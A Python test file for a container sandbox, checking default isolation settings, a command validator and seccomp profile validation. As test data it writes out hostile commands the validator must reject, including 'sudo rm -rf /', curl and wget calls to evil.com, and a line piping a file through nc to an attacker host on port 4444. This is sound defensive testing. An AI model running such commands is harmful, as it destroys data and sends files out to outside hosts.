"""Integration tests for sandbox configuration and validation (no Docker required)."""

from __future__ import annotations

import json
import tempfile

import pytest
from packages.sandbox.config import (
    BASE_IMAGE,
    BLOCKED_COMMANDS,
    ContainerLimits,
    SandboxConfig,
    WorkspaceConfig,
)
from packages.sandbox.manager import (
    SandboxManager,
    validate_command,
    validate_seccomp,
)


class TestSandboxConfig:
    def test_default_config(self):
        cfg = SandboxConfig()
        assert cfg.image == BASE_IMAGE
        assert cfg.network_mode == "none"
        assert cfg.read_only is True
        assert cfg.user == "1000:1000"
        assert "ALL" in cfg.cap_drop

    def test_docker_kwargs_structure(self):
        cfg = SandboxConfig()
        kwargs = cfg.docker_kwargs(environment={"TEST": "1"})
        assert kwargs["image"] == BASE_IMAGE
        assert kwargs["detach"] is True
        assert kwargs["network_mode"] == "none"
        assert kwargs["read_only"] is True
        assert kwargs["user"] == "1000:1000"
        assert kwargs["environment"]["TEST"] == "1"
        assert "/tmp" in kwargs["tmpfs"]
        assert "/workspace" in kwargs["tmpfs"]

    def test_container_limits(self):
        limits = ContainerLimits(nano_cpus=10**9, mem_limit="1g", pids_limit=128)
        assert limits.nano_cpus == 10**9
        assert limits.mem_limit == "1g"

    def test_workspace_config(self):
        ws = WorkspaceConfig(tmp_size="200M", workspace_size="1g")
        assert ws.tmp_size == "200M"


class TestCommandValidation:
    def test_safe_command_allowed(self):
        ok, msg = validate_command("ls -la /workspace")
        assert ok is True

    def test_python_command_allowed(self):
        ok, msg = validate_command("python3 app.py")
        assert ok is True

    def test_blocked_curl(self):
        ok, msg = validate_command("curl http://evil.com")
        assert ok is False
        assert "curl" in msg

    def test_blocked_wget(self):
        ok, msg = validate_command("wget http://evil.com")
        assert ok is False

    def test_blocked_ssh(self):
        ok, msg = validate_command("ssh user@host")
        assert ok is False

    def test_blocked_sudo(self):
        ok, msg = validate_command("sudo rm -rf /")
        assert ok is False

    def test_blocked_docker(self):
        ok, msg = validate_command("docker run -it ubuntu")
        assert ok is False

    def test_pipe_blocked_command(self):
        ok, msg = validate_command("cat file | nc attacker 4444")
        assert ok is False

    def test_all_blocked_commands_covered(self):
        for cmd in BLOCKED_COMMANDS:
            ok, _ = validate_command(cmd)
            assert ok is False, f"Command '{cmd}' should be blocked"


class TestSeccompValidation:
    def test_valid_profile(self):
        with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
            json.dump({
                "defaultAction": "SCMP_ACT_ERRNO",
                "syscalls": [
                    {"names": ["read", "write"], "action": "SCMP_ACT_ALLOW"}
                ],
            }, f)
            f.flush()
            assert validate_seccomp(f.name) is True

    def test_dangerous_syscall_rejected(self):
        with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
            json.dump({
                "defaultAction": "SCMP_ACT_ERRNO",
                "syscalls": [
                    {"names": ["read", "ptrace"], "action": "SCMP_ACT_ALLOW"}
                ],
            }, f)
            f.flush()
            with pytest.raises(ValueError, match="Dangerous syscalls allowed"):
                validate_seccomp(f.name)

    def test_wrong_default_action(self):
        with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
            json.dump({
                "defaultAction": "SCMP_ACT_ALLOW",
                "syscalls": [],
            }, f)
            f.flush()
            with pytest.raises(AssertionError):
                validate_seccomp(f.name)


class TestSandboxManagerInit:
    def test_manager_stores_config(self):
        cfg = SandboxConfig(network_mode="host")
        mgr = SandboxManager(config=cfg)
        assert mgr.config.network_mode == "host"

    def test_manager_default_config(self):
        mgr = SandboxManager()
        assert mgr.config.network_mode == "none"
